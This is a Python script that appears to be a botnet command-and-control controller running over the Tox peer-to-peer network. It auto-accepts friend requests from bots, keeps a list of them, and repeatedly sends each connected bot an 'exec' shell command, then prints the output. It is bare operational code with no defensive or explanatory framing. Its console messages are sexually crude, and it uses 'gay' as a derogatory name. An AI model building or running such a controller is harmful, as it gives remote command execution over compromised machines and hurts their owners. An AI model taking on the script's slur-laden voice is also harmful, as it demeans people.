from __future__ import print_function
from time import sleep
from os.path import exists

from pytox import Tox
import time
import json
import sys
import faulthandler

#this is bad and i feel bad
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

faulthandler.enable(file=sys.stderr, all_threads=True)


SERVER = [
    "63.172.136.118",
    33445,
    "2C289F9F37C20D09DA83565588BF496FAB3764853FA38141817A72E3F18ACA0B"
]


DATA = 'gay.data'


def save_to_file(tox, fname):
    data = tox.get_savedata()
    with open(fname, 'wb') as f:
        f.write(data)


def load_from_file(fname):
    return open(fname, 'rb').read()


bots = []


class ToxOptions():
    def __init__(self):
        self.ipv6_enabled = True
        self.udp_enabled = True
        self.proxy_type = 0  # 1=http, 2=socks
        self.proxy_host = ''
        self.proxy_port = 0
        self.start_port = 0
        self.end_port = 0
        self.tcp_port = 0
        self.savedata_type = 0  # 1=toxsave, 2=secretkey
        self.savedata_data = b''
        self.savedata_length = 0
        self.local_discovery_enabled = True


class gay(Tox):
    def __init__(self, opts=None):
        if opts is not None:
            super(gay, self).__init__(opts)
        print('ID: %s' % self.self_get_address())
        self.self_set_name("jizzie")
        self.wakenbake()

    def wakenbake(self):
        print("o fugg wake n bake")
        self.bootstrap(SERVER[0], SERVER[1], SERVER[2])

    def loop(self):
        checked = False
        try:
            while True:
                status = self.self_get_connection_status()
                if not checked and status:
                    print(
                        'Connected to DHT: jizz on my friccin face oh my god finally christ')
                    checked = True
                if checked and not status:
                    print('Disconnected from DHT: omg just necc me shit fuckkkk')
                    self.wakenbake()
                    checked = False
                self.self_set_name('momma')
                self.self_set_status_message('jizz')
                self.iterate()
                sleep(0.01)
                try:
                    for bot in bots:
                        fid = self.friend_by_public_key(bot)
                        cstat = self.friend_get_connection_status(fid)
                        if cstat == Tox.CONNECTION_TCP or cstat == Tox.CONNECTION_UDP:
                            self.friend_send_message(fid, 0, 'exec uptime')
                            sleep(1)
                except Exception as err:
                    print(err)
                    pass
        except BaseException:
            pass

    def on_friend_request(self, public_key, message):
        print("{0} iz ridin ur dicc... u must b a qt".format(public_key))
        try:
            fid = False
            try:
                fid = self.friend_by_public_key(public_key)
            except BaseException:
                pass
            if fid is False:
                self.friend_add_norequest(public_key)
                bots.append(public_key)
                print("Bot Count: " + str(len(bots)))
        except Exception as err:
            print(err)
            pass

    def on_friend_message(self, friendId, type, message):
        try:
            print('got: %s' % (message))
            #bots.remove(self.friend_get_public_key(friendId))
            #self.friend_delete(friendId)
        except Exception as err:
            print(err)
            pass


opts = None
opts = ToxOptions()

if len(sys.argv) == 2:
    DATA = sys.argv[1]

if exists(DATA):
    opts.savedata_data = load_from_file(DATA)
    opts.savedata_length = len(opts.savedata_data)
    opts.savedata_type = Tox.SAVEDATA_TYPE_TOX_SAVE

im = gay(opts)
im.loop()
